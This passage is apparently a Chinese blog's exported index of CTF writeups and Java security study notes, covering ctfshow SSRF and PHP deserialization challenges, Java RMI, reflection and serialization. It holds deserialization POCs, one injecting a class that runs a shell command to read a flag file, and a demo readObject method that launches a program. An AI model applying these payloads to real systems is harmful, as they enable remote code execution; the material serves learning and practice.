methods&#x3D;[‘POST’])\n@app.route(“&#x2F;ftpcheck”)\n这两个路由，通过DNS污染，完成SSRF提权，执行shell\n但是我SSRF不会\n离谱。学习一下\n","categories":["writeups"],"tags":["RCE","LFI","无数字字母","DNS污染","FTP","nodeJs"]},{"title":"ctfshow_ssrf","url":"/2023/05/18/ctfshow-ssrf/","content":"web351 &lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);?&gt; \n\n\n\ncurl_init()：初始curl会话\ncurl_setopt()：会话设置\ncurl_exec()：执行curl会话,获取内容\ncurl_close()：会话关闭\n\n就是直接可以请求一个网页，然后可以发现底下有 flag.php，但是只有本地能访问，因此在这里我们让 curl 去请求 127.0.0.1/flag.php 即可。\n在之前做过的题目种，我们已经初步接触过本地网页限制访问资源的例子，但是我们都可以伪造，比如 referer 字段或者是 X-Forwarded-for 字段，因为包含在我们请求的 headers 中，因此我们可以直接伪造。但是 $_SERVER 就是我们所不能伪造的了，这个变量是什么呢？\n\n$_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建。不能保证每个服务器都提供全部项目；服务器可能会忽略一些，或者提供一些没有在这里列举出来的项目。这也就意味着大量的此类变量都会在» CGI 1.1 规范中说明，所以应该仔细研究一下。\n\n所以我们对 SERVER 变量进行校验即可判断请求是否来自本地，如果不来自本地则直接拒绝掉。\n&lt;?php if($_SERVER[&#x27;SERVER_ADDR&#x27;]!==&#x27;127.0.0.1&#x27;)&#123;    die(&#x27;非本地访问&#x27;);&#125;echo(&#x27;flag&#123;test_flag&#125;&#x27;);?&gt;\n\n\nweb352\n不写了，环境好像都有问题\n这个答案明显就是不符合的\n","categories":["writeups"],"tags":["ssrf","ctfshow"]},{"title":"ctfshow反序列化","url":"/2023/06/03/ctfshow%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","content":"web254 &lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-12-02 17:44:47# @Last Modified by:   h1xa# @Last Modified time: 2020-12-02 19:29:02# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);highlight_file(__FILE__);include(&#x27;flag.php&#x27;);class ctfShowUser&#123;    public $username=&#x27;xxxxxx&#x27;;    public $password=&#x27;xxxxxx&#x27;;    public $isVip=false;    public function checkVip()&#123;        return $this-&gt;isVip;    &#125;    public function login($u,$p)&#123;        if($this-&gt;username===$u&amp;&amp;$this-&gt;password===$p)&#123;            $this-&gt;isVip=true;        &#125;        return $this-&gt;isVip;    &#125;    public function vipOneKeyGetFlag()&#123;        if($this-&gt;isVip)&#123;            global $flag;            echo &quot;your flag is &quot;.$flag;        &#125;else&#123;            echo &quot;no vip, no flag&quot;;        &#125;    &#125;&#125;$username=$_GET[&#x27;username&#x27;];$password=$_GET[&#x27;password&#x27;];if(isset($username) &amp;&amp; isset($password))&#123;    $user = new ctfShowUser();    if($user-&gt;login($username,$password))&#123;        if($user-&gt;checkVip())&#123;            $user-&gt;vipOneKeyGetFlag();        &#125;    &#125;else&#123;        echo &quot;no vip,no flag&quot;;    &#125;&#125;\n\n核心判断：if($this-&gt;username&#x3D;&#x3D;&#x3D;$u&amp;&amp;$this-&gt;password&#x3D;&#x3D;&#x3D;$p)\n就是xxxxxx\n\nweb255&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-12-02 17:44:47# @Last Modified by:   h1xa# @Last Modified time: 2020-12-02 19:29:02# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);highlight_file(__FILE__);include(&#x27;flag.php&#x27;);class ctfShowUser&#123;    public $username=&#x27;xxxxxx&#x27;;    public $password=&#x27;xxxxxx&#x27;;    public $isVip=false;    public function checkVip()&#123;        return $this-&gt;isVip;    &#125;    public function login($u,$p)&#123;        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;    &#125;    public function vipOneKeyGetFlag()&#123;        if($this-&gt;isVip)&#123;            global $flag;            echo &quot;your flag is &quot;.$flag;        &#125;else&#123;            echo &quot;no vip, no flag&quot;;        &#125;    &#125;&#125;$username=$_GET[&#x27;username&#x27;];$password=$_GET[&#x27;password&#x27;];if(isset($username) &amp;&amp; isset($password))&#123;    $user = unserialize($_COOKIE[&#x27;user&#x27;]);        if($user-&gt;login($username,$password))&#123;        if($user-&gt;checkVip())&#123;            $user-&gt;vipOneKeyGetFlag();        &#125;    &#125;else&#123;        echo &quot;no vip,no flag&quot;;    &#125;&#125; \n\n不一样的点在login函数没有判断了\n看到有个地方可以传入cookie\n整合一下，我们的环境源码过不了了是因为#isVip是false\n如果我们改为true再传入xxxxxx给username和password后面的判断就可以和上一题一样全部通过了\npoc\n&lt;?phpclass ctfShowUser&#123;//    public $username=&#x27;xxxxxx123&#x27;;//    public $password=&#x27;xxxxxx&#x27;;    public $isVip=true;&#125;echo urlencode(serialize(new ctfShowUser()));\n\n\nweb256 &lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-12-02 17:44:47# @Last Modified by:   h1xa# @Last Modified time: 2020-12-02 19:29:02# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);highlight_file(__FILE__);include(&#x27;flag.php&#x27;);class ctfShowUser&#123;    public $username=&#x27;xxxxxx&#x27;;    public $password=&#x27;xxxxxx&#x27;;    public $isVip=false;    public function checkVip()&#123;        return $this-&gt;isVip;    &#125;    public function login($u,$p)&#123;        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;    &#125;    public function vipOneKeyGetFlag()&#123;        if($this-&gt;isVip)&#123;            global $flag;            if($this-&gt;username!==$this-&gt;password)&#123;                    echo &quot;your flag is &quot;.$flag;              &#125;        &#125;else&#123;            echo &quot;no vip, no flag&quot;;        &#125;    &#125;&#125;$username=$_GET[&#x27;username&#x27;];$password=$_GET[&#x27;password&#x27;];if(isset($username) &amp;&amp; isset($password))&#123;    $user = unserialize($_COOKIE[&#x27;user&#x27;]);        if($user-&gt;login($username,$password))&#123;        if($user-&gt;checkVip())&#123;            $user-&gt;vipOneKeyGetFlag();        &#125;    &#125;else&#123;        echo &quot;no vip,no flag&quot;;    &#125;&#125;\n\n这道题问题在于多了一个 if($this-&gt;username!&#x3D;&#x3D;$this-&gt;password)强人所难的一个东西。\n但是还好，就是我们重构一下username和password就好了\npoc\n&lt;?phpclass ctfShowUser&#123;    public $username=&#x27;xxxxxx123&#x27;;    public $password=&#x27;xxxxxx&#x27;;    public $isVip=true;&#125;echo urlencode(serialize(new ctfShowUser()));\n\n\nweb257 &lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-12-02 17:44:47# @Last Modified by:   h1xa# @Last Modified time: 2020-12-02 20:33:07# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);highlight_file(__FILE__);class ctfShowUser&#123;    private $username=&#x27;xxxxxx&#x27;;    private $password=&#x27;xxxxxx&#x27;;    private $isVip=false;    private $class = &#x27;info&#x27;;    public function __construct()&#123;        $this-&gt;class=new info();    &#125;    public function login($u,$p)&#123;        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;    &#125;    public function __destruct()&#123;        $this-&gt;class-&gt;getInfo();    &#125;&#125;class info&#123;    private $user=&#x27;xxxxxx&#x27;;    public function getInfo()&#123;        return $this-&gt;user;    &#125;&#125;class backDoor&#123;    private $code;    public function getInfo()&#123;        eval($this-&gt;code);    &#125;&#125;$username=$_GET[&#x27;username&#x27;];$password=$_GET[&#x27;password&#x27;];if(isset($username) &amp;&amp; isset($password))&#123;    $user = unserialize($_COOKIE[&#x27;user&#x27;]);    $user-&gt;login($username,$password);&#125;\n\nhttps://blog.csdn.net/qq_45300786/article/details/108462663#:~:text=%E5%AF%B9%E8%B1%A1%E8%A7%A6%E5%8F%91%E5%92%8C%E5%AF%B9%E8%B1%A1%E8%A7%A6%E5%8F%91%E5%AE%8C%EF%BC%8C%E8%87%AA%E5%8A%A8%E9%94%80%E6%AF%81%E3%80%82,%E6%89%80%E4%BB%A5%E5%8F%AA%E6%9C%89_construct%20%E5%92%8C_destruct%E6%98%BE%E7%A4%BA\n魔术方法调用\n&lt;?phpclass ctfShowUser&#123;    private $username=&#x27;xxxxxx&#x27;;    private $password=&#x27;xxxxxx&#x27;;    private $class = &#x27;&#x27;;    public function __construct()&#123;        $this-&gt;class=new backDoor();    &#125;&#125;class backDoor&#123;    private $code=&#x27;system(&quot;cat ./flag.php&quot;);&#x27;;&#125;echo(urlencode(serialize(new ctfShowUser)));\n\nPOC\nweb258 &lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-12-02 17:44:47# @Last Modified by:   h1xa# @Last Modified time: 2020-12-02 21:38:56# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);highlight_file(__FILE__);class ctfShowUser&#123;    public $username=&#x27;xxxxxx&#x27;;    public $password=&#x27;xxxxxx&#x27;;    public $isVip=false;    public $class = &#x27;info&#x27;;    public function __construct()&#123;        $this-&gt;class=new info();    &#125;    public function login($u,$p)&#123;        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;    &#125;    public function __destruct()&#123;        $this-&gt;class-&gt;getInfo();    &#125;&#125;class info&#123;    public $user=&#x27;xxxxxx&#x27;;    public function getInfo()&#123;        return $this-&gt;user;    &#125;&#125;class backDoor&#123;    public $code;    public function getInfo()&#123;        eval($this-&gt;code);    &#125;&#125;$username=$_GET[&#x27;username&#x27;];$password=$_GET[&#x27;password&#x27;];if(isset($username) &amp;&amp; isset($password))&#123;    if(!preg_match(&#x27;/[oc]:\\d+:/i&#x27;, $_COOKIE[&#x27;user&#x27;]))&#123;        $user = unserialize($_COOKIE[&#x27;user&#x27;]);    &#125;    $user-&gt;login($username,$password);&#125;\n\n","categories":["writeups"],"tags":["反序列化","ctfshow"]},{"title":"docker学习笔记","url":"/2023/08/15/docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","content":"DOCKER安装官网：docs.docker.com\n阿里镜像：mirrors.aliyun.com\n版本问题：7.3 ，7.2，7.1，7.0的centos不能装docker，有很多bug\n内核要求：centos内核要求3.0以上\n","categories":["工作"],"tags":["work","docker"]},{"title":"hgame-week1","url":"/2023/05/11/hgame-week1/","content":"[HGAME 2023 week1]Classic Childhood Game\n经典前端游戏题，细心点找js代码都可以\n","categories":["writeups"],"tags":["反序列化","thinkphp"]},{"title":"java_rmi基本操作","url":"/2023/07/21/java-rmi%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/","content":"前言面试挂了，虽然是因为老板觉得我年龄太小，怕是暑假共干不久，但是千万种原因还是得归结于自身，要是自己水平天下第一高，谁又在乎别的呢？就是自己卡在了及格线罢了\n继续Java的学习，学习java越来越发现基础很重要，所以这里回顾一下RMI\n什么是RMI远程调用，为什么会出现这个东西，其实就是客户端想要运行别的地方的java代码，这是一个刚需。\n\n这里有个图，大致原理就是RMI有一个服务端，我们的客户客户端想要运行一个没有的代码，去向RMI服务端要，比如一个对象，这个怎么去要呢？他怎么知道要哪个呢？或者说，服务端怎么知道要给哪个，这里就出现了一个叫注册中心的东西，所有的服务要通过注册中心进行查询，注册中心也会为这些对象动态的绑定端口，这样就不会出现端口冲突的情况\n代码我看白神的课程，自己把代码敲了一遍\n他的代码分客户端和服务端，在自己的主机上面模拟了远程调用\nserverIRemoteObj\npackage org.example;import java.rmi.Remote;import java.rmi.RemoteException;public interface IRemoteObj extends Remote &#123;    public String sayHello(String keywords) throws RemoteException;&#125;\n\n这里创建了一个接口，接收了一个String类型的参数，这里注意一定是要继承Remote类\nRemoteObjImpl\npackage org.example;import java.rmi.RemoteException;import java.rmi.server.UnicastRemoteObject;public class RemoteObjImpl extends UnicastRemoteObject implements IRemoteObj &#123;    public RemoteObjImpl() throws RemoteException &#123;    &#125;    @Override    public String sayHello(String keywords)&#123;        String upKeywords=keywords.toUpperCase();        System.out.println(upKeywords);        return upKeywords;    &#125;&#125;\n\n这里java类进行了实现，继承UnicastRemoteObject，实现上面的IRmoteObj\n同时重写了sayHello方法，实现了接口\nRMIServer\npackage org.example;import java.rmi.AlreadyBoundException;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class RMIServer &#123;    public static void main(String[] args) throws RemoteException, AlreadyBoundException &#123;        IRemoteObj remoteObj=new RemoteObjImpl();        Registry r= LocateRegistry.createRegistry(1099);        r.bind(&quot;remoteObj&quot;,remoteObj);    &#125;&#125;\n\n这里是主类，throws RemoteException, AlreadyBoundException这个是一定要的，虽然我不知道为什么，可能会报错把\n然后创建了一个对象，\n注意\nRegistry r= LocateRegistry.createRegistry(1099);\n\n这里是创建了一个注册中心，注册中心本身的端口是1099，这个端口用来连接客户端，有了这一个端口，服务端就可以正常被来连接\nr.bind(&quot;remoteObj&quot;,remoteObj);\n\n这个就是一个绑定\ncilentIRemoteObj\npackage org.example;import java.rmi.Remote;import java.rmi.RemoteException;public interface IRemoteObj extends Remote &#123;    public String sayHello(String keywords) throws RemoteException;&#125;\n\n客户端创建一个接口\nRMIClient\npackage org.example;import java.rmi.NotBoundException;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class  RMIClient &#123;    public static void main(String[] args) throws RemoteException, NotBoundException &#123;        Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;,1099);        IRemoteObj remoteObj =(IRemoteObj) registry.lookup(&quot;remoteObj&quot;);        remoteObj.sayHello(&quot;hello&quot;);    &#125;&#125;\n\n这里是客户端主要代码用注册中心进行ip和端口的连接\n然后后lookup方法去找对象\n最后进行调用\n结尾简单的demo，用来理解rmi的基本工作原理\n","categories":["java"],"tags":["java","RMI"]},{"title":"java_rmi服务端创建调试","url":"/2023/07/21/java-rmi%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%88%9B%E5%BB%BA%E8%B0%83%E8%AF%95/","content":"前言继续学习rmi，这里开始一个很恶心的调试，不一定对，我自己反复琢磨了两三遍，记录一下调试心得\n代码\n还是和上篇博客一模一样的代码，因为这里我只想了解一下客户端的创建，不管注册中心和绑定，所以直接注释\n调试\n直接step in。这里是父类，实现类。\n\n继续就会发现他给了一个port默认是0\n我们的port赋值给了this.port 并且出现了一个exportObject,这是一个导出对象的一个类，看起来很重要，继续调试\n\n调用了一个super方法\n这个super方法我没看出来有什么用，里面是在给ref赋值为null\n\n一直step in下去，可以看到一个这个调用，有一个liveRef\n\n\n这里自动获取了我们的ip还有默认的port\n\n这里是有一个createProxy函数，明显是要给我们创建代理\n\n这里还有一个函数检测是否继承与java.rmi.Remote\n后面很多调试都是和这个一样做继承检测\n\n这里之后端口就是有了变换，也就是TCPENDpoint随机分配了端口\n继续可以看到\n\n这一步之后会调用\nUnicastServerRef这个，一个用户客户端一个用于服务端。\nUnicastRef是UnicastServerRef的父类，UnicastServerRef继承UnicastRef使用于服务端，后者直接使用于客户端。\n\n\n然后我们进入了target类里面，不难看出，他把所有和封装有关系的包括客户端代理都放到了这里面\n\n这里面一直用的都是liveref的赋值，这一个liveref类几乎走完了一整个调试流程\n同时这里也创建了线程，后面的服务就是在这里开始等待\n\n这里就是在transport类里面发出服务\n总结一下，在服务端创建远程对象过程中，核心为LiveRef，LiveRef对象中包含了远程对象占用的地址和端口，以及对象UID。当一个远程对象被创建时，会生成一个服务器本地的RemoteObject对象，它持有一个UnicastServerRef对象，UnicastServerRef对象持有一个LiveRef对象；远程对象被创建时，还会生成一个UnicastRef对象，并封装到stub代理中，它持有与UnicastServerRef相同的LiveRef，stub后续发布到注册表，以供客户端使用。\n最后写的很烂，主要是调试能力不行，还有很多是错误的，凑合着看吧，后续能力增长会去改进的\n","categories":["java"],"tags":["java","RMI"]},{"title":"java-反射","url":"/2023/07/14/java-%E5%8F%8D%E5%B0%84/","content":"前言前面一段时间都在忙着准备面试，加上比较懒，也不知道后面会不会有心情写一个面试总结到这里来。但是学习是这辈子都不会停止的，要从这里开始继续记录java的学习。有一些java的很基础的东西我都记录在自己的xmind上了，懒得传上来了，这里从反射开始记录，反射还是很重要的嘞。从现在开始我也会尽量减少文字描述，但是增强逻辑性连贯性，做一个优质笔记者\n反射由来的思考java中提供了一种机制，这个机制可以帮助我们动态的获取和操作java类。有一个简单的问题，反射为什么要存在，这个东西允许我们通过实例，反推出泛型，利用其中的属性，方法，甚至是私有的都没有问题，这对于我们来说是前所未有的好事，因为操控了这些东西，反序列化攻击，利用等等仿佛都是轻而易举的事情。那为什么oracle会干这样的事情呢？\nUses of ReflectionReflection is commonly used by programs which require the ability to examine or modify the runtime behavior of applications running in the Java virtual machine. This is a relatively advanced feature and should be used only by developers who have a strong grasp of the fundamentals of the language. With that caveat in mind, reflection is a powerful technique and can enable applications to perform operations which would otherwise be impossible.    Extensibility FeaturesAn application may make use of external, user-defined classes by creating instances of extensibility objects using their fully-qualified names.Class Browsers and Visual Development EnvironmentsA class browser needs to be able to enumerate the members of classes. Visual development environments can benefit from making use of type information available in reflection to aid the developer in writing correct code.Debuggers and Test ToolsDebuggers need to be able to examine private members on classes. Test harnesses can make use of reflection to systematically call a discoverable set APIs defined on a class, to insure a high level of code coverage in a test suite.\n\n这是官方文档的描述\n简单来说就是为了开发更加简单。\n反射的利用先上我的利用学习poc\nimport java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.Method;public class ReflectionTest &#123;    public static void main(String[] args) throws Exception&#123;         Person person =new Person();         Class c=person.getClass();         //利用反射获取泛型类，然后获取构造方法，然后正常取构造实体         Constructor personConstructor= c.getConstructor(String.class,int.class);         Person p=(Person) personConstructor.newInstance(&quot;Dr0se&quot;,20);         System.out.println(p);         //获取属性 获取可以利用泛型来处理         Field[] personfields=c.getDeclaredFields();         for(Field f:personfields)&#123;             System.out.println(f);         &#125;         //修改属性 修改则不一样，必须修改实例，也就是有值的实例，不然我修改他干嘛         Field namefield=c.getField(&quot;name&quot;);         namefield.set(p,&quot;Dr0se-mirror1&quot;);         System.out.println(p);        Field agefield=c.getDeclaredField(&quot;age&quot;);        namefield.set(p,&quot;Dr0se-mirror2&quot;);        agefield.setAccessible(true);//这里权限的打开很重要        agefield.set(p,19);        System.out.println(p);//        Method[] personMethods= c.getMethods();//        for(Method m:personMethods)&#123;//            System.out.println(m);//        &#125;          Method actionMethod=c.getDeclaredMethod(&quot;action&quot;, String.class);//这里需要在输入实例类，后面一个参数给出参数类型          actionMethod.setAccessible(true);          actionMethod.invoke(p,&quot;Dr0se love zhenzhen&quot;);    &#125;&#125;\n\n首先反射类肯定是有一个包的就是 java.lang.reflect.*\n反射的利用的核心思想就是利用实例反推出Class泛型，利用这个泛型进行反射操作\n我的poc里面写出了对于属性的获取，改操作还有方法的调用操作\n首先我的最开始的语句里面核心的东西就是\nClass c=person.getClass();\n\n这里利用实体类获取到了泛型c。这里我觉得是反射的核心，是基础。\n//利用反射获取泛型类，然后获取构造方法，然后正常取构造实体        Constructor personConstructor= c.getConstructor(String.class,int.class);        Person p=(Person) personConstructor.newInstance(&quot;Dr0se&quot;,20);        System.out.println(p);        //获取属性 获取可以利用泛型来处理        Field[] personfields=c.getDeclaredFields();        for(Field f:personfields)&#123;            System.out.println(f);        &#125;\n\n可以看到我利用c泛型反射带上的getConstructor方法获取了person类的构造方法，进而构造出来了person的实例p，同时利用了newinstance方法构造实例，赋值属性\n我为了看看这个泛型，我对其属性也进行了遍历输出，但是这里看到\nField[] personfields=c.getDeclaredFields();\n\n首先这里是用数组进行接收，然后需要注意的地方是getDeclaredFields()方法，这里加了Declared就是可以获取私有，没有就只有public\n//修改属性 修改则不一样，必须修改实例，也就是有值的实例，不然我修改他干嘛        Field namefield=c.getField(&quot;name&quot;);        namefield.set(p,&quot;Dr0se-mirror1&quot;);        System.out.println(p);       Field agefield=c.getDeclaredField(&quot;age&quot;);       namefield.set(p,&quot;Dr0se-mirror2&quot;);       agefield.setAccessible(true);//这里权限的打开很重要       agefield.set(p,19);       System.out.println(p);\n\n其余修改属性的代码\n也是一摸一样的用法，调用set方法完成修改，然后注意，pravite方法需要我们去用Declared同时需要去开启权限\n最后是方法的获取\nMethod actionMethod=c.getDeclaredMethod(&quot;action&quot;, String.class);//这里需要在输入实例类，后面一个参数给出参数类型          actionMethod.setAccessible(true);          actionMethod.invoke(p,&quot;Dr0se love zhenzhen&quot;);\n\n这里需要注意的是，我们在获取方法的时候，除了方法名，也要给他方法的参数，不然就是不知道的\n然后我们需要调用invoke方法，这里和魔术方法反序列化没有个p关系\n结尾反射的大概其实就是这些，后续有遇到的会继续更新修改。\n现在还在等面试结果，还要个两三天，紧张捏。也不知道后面还有多少时间继续学习。\n","categories":["java"],"tags":["java","反射"]},{"title":"java_反序列化和序列化","url":"/2023/07/23/java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%BA%8F%E5%88%97%E5%8C%96/","content":"前言学习cc链的时候，发现自己对于java序列化反序列化的真正含义还是不太理解，，最近也是感觉记忆力不太好了，很多刚刚学完的东西却记不住，只能多多复习和温故，这一篇简单的知识会一笔带过，主要还是帮助温故一些知识。\n序列化与反序列化这里就不用说了，都烂了，就是转换形式方便传输，序列化一个东西变成一个什么，然后再反序列化返回变回来\n一点点代码public static void serialize(Object obj) throws IOException&#123;       ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));//读取文件       oos.writeObject(obj);   &#125;\n\npublic static  Object unserialze(String Filename) throws IOException,ClassNotFoundException&#123;     ObjectInputStream ois =new ObjectInputStream(new FileInputStream(Filename));     Object obj =ois.readObject();     return obj; &#125;\n\n这里自己写了java的序列化和反序列化的类，只需要再main函数里面调用就可以\n这里面也是可以看出来，是吧类序列化成为一个文件，然后反序列化也是需要读取一个filename，就可以把这个对象反序列化回来\n反序列化漏洞的两种思想想要触发漏洞，这里就是可以思考两个方向，因为我们最后反序列化的时候一定会调用readObject类，那我们想要搞事情就一定是在这里做文章\n1.readObject类被重写，里面就有任意代码的执行，或者是危险函数\n2.readObject类包含一个类,这个类又反复包含一个新类,最后有一条链子直接通向了危险函数\n1import java.io.IOException;import java.io.ObjectInputStream;import java.io.Serializable;public class Person implements Serializable &#123;//实现这个接口的类才可以序列化//    private transient String name;    public  String name;    private int age;    public static int id;    static &#123;        System.out.println(&quot;静态代码块&quot;);    &#125;    public static void staticAction()&#123;        System.out.println(&quot;静态方法&quot;);    &#125;    &#123;        System.out.println(&quot;构造代码块&quot;);    &#125;    public Person()&#123;        System.out.println(&quot;person&quot;);    &#125;    public Person(String name,int age)&#123;        System.out.println(&quot;有参person&quot;);        this.name=name;        this.age=age;    &#125;    @Override    public String toString()&#123;        return &quot;Person&#123;&quot;+                &quot;name=&#x27;&quot;+name+&#x27;\\&#x27;&#x27;+                &quot;, age=&quot;+age+                &#x27;&#125;&#x27;;    &#125;    private void action(String act)&#123;        System.out.println(act);    &#125;    private void  readObject(ObjectInputStream ois) throws IOException,ClassNotFoundException&#123;        ois.defaultReadObject();        Runtime.getRuntime().exec(&quot;calc&quot;);    &#125;&#125;\n\n比如这里就是我直接在需要序列化和反序列化的person类里面重写了readObject方法\n直接就是调用计算器,但是这样想想也是一般做不到的,谁没事重写这个还写个恶意的代码\n","categories":["java"],"tags":["反序列化","java","序列化"]},{"title":"php_bugs-master-1到5","url":"/2023/05/09/php-bugs-master-1%E5%88%B05/","content":"前言代码审计得从基础做起。今天逛github找到了一个看起来还不错的项目php_bugs。star还是挺多的学习一下\n环境搭建问题想要可以有web in server。phpstorm本身我没有跑起来，有个简单方法，可以放到phpstudy里面跑起来。这个实测是很简单的。\n01 extract变量覆盖.php&lt;?phperror_reporting(0);$flag=&#x27;xxx&#x27;; extract($_GET); if(isset($shiyan)) &#123;     $content=trim(file_get_contents($flag));    if($shiyan==$content)    &#123;         echo&#x27;ctf&#123;xxx&#125;&#x27;;     &#125;   else   &#123;     echo&#x27;Oh.no&#x27;;   &#125;    &#125;?&gt;\n\nextract函数得看看是什么\n\nextract() 函数从数组中将变量导入到当前的符号表。该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。该函数返回成功设置的变量数目。\n好像很不太懂，感觉就是把值赋给变量巴拉巴拉\n这里举个例子\n\n大概是可以理解了\n也就是说我们通过$GET传参，对应的参数和值会被当作数组，然后就可以啊吧啊吧\n\n进入这个if，emmmm\n不传值就好了，可是有小可爱会问。不传值，isset怎么半\n在PHP中，null和空是两个不同的概念。\n\n看看我传的参\n再看看我修改的源码\n\n我们想要flag，很简单，flag变量随便输入，因为我们没有文件\n结束\nextract()会将$flag和$shiyan的值覆盖了，将变量的值设置为空或者不存在的文件就满足$shiyan== $content。\n02 绕过过滤的空白字符&lt;?php $info = &quot;&quot;; $req = [];$flag=&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;; ini_set(&quot;display_error&quot;, false); //为一个配置选项设置值error_reporting(0); //关闭所有PHP错误报告 if(!isset($_GET[&#x27;number&#x27;]))&#123;   header(&quot;hint:26966dc52e85af40f59b4fe73d8c323a.txt&quot;); //HTTP头显示hint 26966dc52e85af40f59b4fe73d8c323a.txt    die(&quot;have a fun!!&quot;); //die — 等同于 exit() &#125; foreach([$_GET, $_POST] as $global_var) &#123;  //foreach 语法结构提供了遍历数组的简单方式     foreach($global_var as $key =&gt; $value) &#123;         $value = trim($value);  //trim — 去除字符串首尾处的空白字符（或者其他字符）        is_string($value) &amp;&amp; $req[$key] = addslashes($value); // is_string — 检测变量是否是字符串，addslashes — 使用反斜线引用字符串    &#125; &#125;   function is_palindrome_number($number) &#123;     $number = strval($number); //strval — 获取变量的字符串值    $i = 0;     $j = strlen($number) - 1; //strlen — 获取字符串长度    while($i &lt; $j) &#123;         if($number[$i] !== $number[$j]) &#123;             return false;         &#125;         $i++;         $j--;     &#125;     return true; &#125;   if(is_numeric($_REQUEST[&#x27;number&#x27;])) //is_numeric — 检测变量是否为数字或数字字符串 &#123;    $info=&quot;sorry, you cann&#x27;t input a number!&quot;; &#125;elseif($req[&#x27;number&#x27;]!=strval(intval($req[&#x27;number&#x27;]))) //intval — 获取变量的整数值&#123;      $info = &quot;number must be equal to it&#x27;s integer!! &quot;;   &#125;else&#123;      $value1 = intval($req[&quot;number&quot;]);     $value2 = intval(strrev($req[&quot;number&quot;]));        if($value1!=$value2)&#123;          $info=&quot;no, this is not a palindrome number!&quot;;     &#125;     else     &#123;           if(is_palindrome_number($req[&quot;number&quot;]))&#123;              $info = &quot;nice! &#123;$value1&#125; is a palindrome number!&quot;;           &#125;          else          &#123;             $info=$flag;          &#125;     &#125; &#125; echo $info;\n\n慢慢看吧有点长\nif(!isset($_GET[&#x27;number&#x27;]))&#123;   header(&quot;hint:26966dc52e85af40f59b4fe73d8c323a.txt&quot;); //HTTP头显示hint 26966dc52e85af40f59b4fe73d8c323a.txt    die(&quot;have a fun!!&quot;); //die — 等同于 exit() &#125;\n\n这里就是用来检测有没有number这个参数\n不然给你一个hint然后让你die\nforeach([$_GET, $_POST] as $global_var) &#123;  //foreach 语法结构提供了遍历数组的简单方式     foreach($global_var as $key =&gt; $value) &#123;         $value = trim($value);  //trim — 去除字符串首尾处的空白字符（或者其他字符）        is_string($value) &amp;&amp; $req[$key] = addslashes($value); // is_string — 检测变量是否是字符串，addslashes — 使用反斜线引用字符串    &#125; &#125; \n\n接下来来了两个foreach循环\n用foreach循环遍历$_GET和$_POST数组，将参数值去除首尾空格，并且使用addslashes()函数将参数值中的特殊字符进行转义，以防止SQL注入等攻击\n其实这里就要有一个思想，get，post传参传进来的东西，都可以当作数组处理\n\nfunction is_palindrome_number($number) &#123;     $number = strval($number); //strval — 获取变量的字符串值    $i = 0;     $j = strlen($number) - 1; //strlen — 获取字符串长度    while($i &lt; $j) &#123;         if($number[$i] !== $number[$j]) &#123;             return false;         &#125;         $i++;         $j--;     &#125;     return true; &#125; \n\n这是一个回文串检测的函数，emmmm，这么简单就不解释了吧\nif(is_numeric($_REQUEST[&#x27;number&#x27;])) //is_numeric — 检测变量是否为数字或数字字符串 &#123;    $info=&quot;sorry, you cann&#x27;t input a number!&quot;; &#125;\n\nelseif($req[&#x27;number&#x27;]!=strval(intval($req[&#x27;number&#x27;]))) //intval — 获取变量的整数值&#123;      $info = &quot;number must be equal to it&#x27;s integer!! &quot;;   &#125;\n\n这里是把输入转换为数字又变为字符串，再比较，检查其是否为一个合法的整数。如果输入不是整数，则会将 $info 变量设置为错误消息字符串。\n代码很复杂我们进行一下简化，再把思路整合一下\n$info = &quot;&quot;; $req = [];$flag=&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;;//三个变量if(!isset($_GET[&#x27;number&#x27;]))//number参数得有if(is_numeric($_REQUEST[&#x27;number&#x27;])) //is_numeric — 检测变量是否为数字或数字字符串 $req[&#x27;number&#x27;]!=strval(intval($req[&#x27;number&#x27;]))//判断为整数$value1 = intval($req[&quot;number&quot;]);$value2 = intval(strrev($req[&quot;number&quot;]));  //两个变量，反转字符串if($value1!=$value2)&#123;          $info=&quot;no, this is not a palindrome number!&quot;;     &#125;    